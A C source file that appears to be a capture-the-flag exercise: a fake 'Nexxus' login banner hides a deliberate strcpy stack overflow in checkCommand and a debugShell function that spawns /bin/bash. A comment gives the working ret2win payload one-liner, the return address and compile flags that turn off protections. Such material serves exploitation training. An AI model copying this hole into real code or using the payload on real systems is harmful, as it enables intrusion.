#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
 * get address of `flag` function with `readelf -a debugShell | grep flag` (0x401256)
 * Returning to the start of debugShell will cause a segfault because the stack will be misaligned
 * This is triggered in do_system by the `movaps` instruction. To avoid the mis alignment, we return
 * 2 instruction in, to avoid the 8-byte push of ebp to the stack, preventing the stack from becoming
 * non-16-byte aligned.
 * cat <(python3 -c "print('backup' + 'A'*26 + 'B'*8 + '\x5b\x12\x40')") - | ./ret2normal
 * gcc -O0 -fno-stack-protector -no-pie pwn3.c -o pwn3
 */

void debugShell() {
    int d = 0;
    d = system("/bin/bash");
    if (d == 0) {
        puts("Debugging shell: success");
    } else {
	    puts("Dbugging shell: fail");
    }
}

void checkCommand(char* command) {
    char commandString[32];
    strcpy(commandString, command);
    if (!strncmp(commandString, "backup", strlen("backup"))) {
        puts("Command accepted. Functionality removed. <3 TSK.");
    } else {
        puts("Invalid command.");
        exit(-1);
    }
}


int main(int argc, char** argv)
{
    char commandString[256];
    memset(&commandString, 0, 256);

    puts(" ****************************************************************************\n \
This is a Nexxus computer system, which may be accessed\n  \
and used only for authorized Nexxus business by authorized personnel.\n \
Unauthorized access or use of this computer system may subject violators\n \
to criminal, civil, and/or administrative action.\n\n \
All information on this computer system may be intercepted, recorded,\n \
read, copied, and disclosed by and to authorized personnel for official\n \
purposes, including criminal investigations. Such information includes\n \
sensitive data encrypted to comply with confidentiality and privacy\n \
requirements. Access or use of this computer system by any person, whether\n \
authorized or unauthorized, constitutes consent to these terms. There is no\n \
right of privacy in this system.\n \
****************************************************************************\n");

    // prompt user
    fputs("Command: ", stdout);
    fflush(stdout);

    // get command remove newline chars
    fgets(commandString, 256, stdin);
    commandString[strcspn(commandString, "\r\n")] = 0;
    checkCommand(commandString);

    puts("Disconnected.");
    return EXIT_SUCCESS;
}
